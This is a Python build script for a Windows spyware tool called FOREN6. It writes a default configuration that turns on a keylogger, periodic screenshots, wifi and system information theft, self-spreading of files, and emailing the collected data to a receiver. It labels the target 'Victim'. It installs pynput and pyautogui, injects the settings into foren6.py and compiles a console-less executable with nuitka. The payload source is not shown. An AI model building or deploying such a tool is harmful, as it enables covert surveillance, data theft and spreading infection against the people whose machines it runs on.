import os
import platform
import configparser
import fileinput
import shutil

system = platform.system()

config = configparser.ConfigParser()
	
def readConfigurationFile():
	# Check if the configuration file exists
	try:
		configFile = open("config.ini")
		configFile.close()
		config.read("config.ini")
	except:
		# Create a default configuration file
		config['general'] = {}
		config['general']['send_info'] = 'True'
		config['general']['take_screenshot'] = 'True'
		config['general']['enable_key_logger'] = 'True'
		config['general']['get_wifi_info'] = 'True'
		config['general']['get_system_info'] = 'True'
		config['general']['spread_files'] = 'True'

		config['cooldown'] = {}
		config['cooldown']['email_send_time'] = '120'
		config['cooldown']['screenshot_time'] = '60'

		config['emailInformation'] = {}
		config['emailInformation']['info_email_receiver'] = ''
		config['emailInformation']['sender_email_address'] = ''
		config['emailInformation']['sender_email_password'] = ''

		config['miscellaneous'] = {}
		config['miscellaneous']['victim_name'] = 'Victim'

		with open('config.ini', 'w') as configFile:
			config.write(configFile)
			configFile.close()

if system == "Windows":
	readConfigurationFile()

	# Get configuration info and insert it into a copy of the FOREN6 script
	if "config" in locals():
		general = config["general"]
		cooldown = config['cooldown']
		emailInformation = config['emailInformation']
		miscellaneous = config['miscellaneous']

		# Build a dictionary of configuration values
		data = {
			"info_email_receiver": emailInformation['info_email_receiver'],
			"send_info": bool(general['send_info']),
			"email_send_time": int(cooldown['email_send_time']),
			"take_screenshot": bool(general['take_screenshot']),
			"screenshot_time": int(cooldown['screenshot_time']),
			"spread_files": bool(general['spread_files']),
			"key_logger": bool(general['enable_key_logger']),
			"get_wifi_info": bool(general['get_wifi_info']),
			"get_system_info": bool(general['get_system_info']),
			"victim_name": miscellaneous['victim_name'],
			"sender_email_address": emailInformation['sender_email_address'],
			"sender_email_password": emailInformation['sender_email_password']
		}

		# Make a build folder
		if not os.path.exists(os.getcwd() + "/build"):
			os.mkdir(os.getcwd() + "/build")

		# Make a copy of FOREN6 to insert custom configurations into
		shutil.copyfile("foren6.py", "build/foren6_1.py")

		foundOldContents = False

		# Locate insertion point and overwrite default options
		for line in fileinput.input("build/foren6_1.py", inplace=True):
			line = line.rstrip()

			if line == "# <--BEGIN BUILD FILE INSERTION-->":
				foundOldContents = True
				print(line)
				print("data = " + str(data))
			elif line == "# <--END BUILD FILE INSERTION-->":
				foundOldContents = False

			if not foundOldContents:
				print(line)
        
	print("Building FOREN6...")
	print("Downloading dependencies...")
	print("Downloading emails...")
	os.system("pip install emails")
	print("Complete.")
	print("Downloading pynput...")
	os.system("pip install pynput==1.6.8")
	print("Complete.")
	print("Downloading smtplib...")
	os.system("pip install secure-smtplib")
	print("Complete.")
	print("Downloading pyautogui...")
	os.system("pip install pyautogui")
	print("Complete.")
	print("Downloading requests...")
	os.system("pip install requests")
	print("Complete.")
	print("Downloading nuitka...")
	os.system("pip install -U nuitka")
	print("Downloading pillow")
	os.system("pip install pillow")
	print("Downloaded all dependencies.")
	print("Creating executable...")
	if os.path.exists(os.getcwd() + "/foren6.exe"): # Delete existing executables
			os.remove(os.getcwd() + "/foren6.exe")
	os.system(f"nuitka --mingw64 --windows-disable-console build/foren6_1.py")
	os.rename(os.getcwd() + "/foren6_1.exe", os.getcwd() + "/foren6.exe") # Rename file
	input("Build complete!")
else:
    input("Can only build for Windows machines!")